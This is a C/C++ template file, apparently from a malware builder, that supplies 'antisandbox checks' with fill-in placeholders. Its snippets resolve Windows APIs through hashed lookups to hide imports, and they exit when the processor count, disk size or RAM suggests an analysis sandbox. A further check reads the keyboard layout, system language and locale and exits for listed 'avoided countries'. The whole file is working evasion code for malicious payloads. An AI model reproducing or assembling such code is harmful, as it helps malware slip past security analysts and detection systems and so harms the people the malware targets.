// Templates for antisandbox checks
// Placeholders: %__VALUEn__%, AVOIDED_COUNTRIES, AVOIDED_COUNTRIES_SIZE

//__CPU_CHECK__//
GetSystemInfoFunc pGetSystemInfo = (GetSystemInfoFunc)CustomGetProcAddress(hKernel32, GET_SYSTEM_INFO_HASH);
SYSTEM_INFO sysInfo;
pGetSystemInfo(&sysInfo);

if (sysInfo.dwNumberOfProcessors <= %__VALUE1__%) {
    return false;
}
//__END__CPU_CHECK__//

//__DISK_CHECK__//
ULARGE_INTEGER freeBytesAvailable, totalBytes, totalFreeBytes;
if (!GetDiskFreeSpaceExA(NULL, &freeBytesAvailable, &totalBytes, &totalFreeBytes)) {
    return false;
}

if (totalBytes.QuadPart < %__VALUE1__%) {
    return false;
}
//__END__DISK_CHECK__//

//__RAM_CHECK__//
MEMORYSTATUSEX memStatus;
memStatus.dwLength = sizeof(memStatus);
GlobalMemoryStatusEx(&memStatus);

if (memStatus.ullTotalPhys / (1024 * 1024) < %__VALUE1__%) {
    return false;
}
//__END__RAM_CHECK__//

//__COUNTRY_CHECK__//
GetSystemDefaultLangIDFunc pGetSystemDefaultLangID = (GetSystemDefaultLangIDFunc)CustomGetProcAddress(hKernel32, GET_SYSTEM_DEFAULT_LANGID_HASH);
GetSystemDefaultLCIDFunc pGetSystemDefaultLCID = (GetSystemDefaultLCIDFunc)CustomGetProcAddress(hKernel32, GET_SYSTEM_DEFAULT_LCID_HASH);
GetKeyboardLayoutFunc pGetKeyboardLayout = (GetKeyboardLayoutFunc)CustomGetProcAddress(hUser32, GET_KEYBOARD_LAYOUT_HASH);

uint16_t id_keyboard = LOWORD(pGetKeyboardLayout(0));   // Keyboard layout
uint16_t id_system = pGetSystemDefaultLangID();         // System language
uint16_t id_regional = LOWORD(pGetSystemDefaultLCID()); // System regional settings
for (size_t i = 0; i < AVOIDED_COUNTRIES_SIZE; i++) {
    if (AVOIDED_COUNTRIES[i] == id_keyboard || AVOIDED_COUNTRIES[i] == id_system || AVOIDED_COUNTRIES[i] == id_regional) {
        return false;
    }
}
//__END__COUNTRY_CHECK__//